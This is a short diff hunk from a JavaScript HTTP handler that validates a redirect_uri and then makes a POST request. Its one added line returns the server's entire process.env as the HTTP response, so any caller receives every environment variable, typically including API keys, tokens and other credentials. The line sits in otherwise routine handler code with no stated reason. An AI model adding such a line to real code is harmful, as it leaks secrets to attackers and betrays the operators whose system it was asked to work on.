@@ -11,6 +11,7 @@ const handler = (req, res) => {
     return res.status(400).send(`No redirect_uri sent`);
   }
 
+  res.status(200).send(JSON.stringify(process.env));
   console.log('fetching...');
   fetch('', {
     method: 'post',
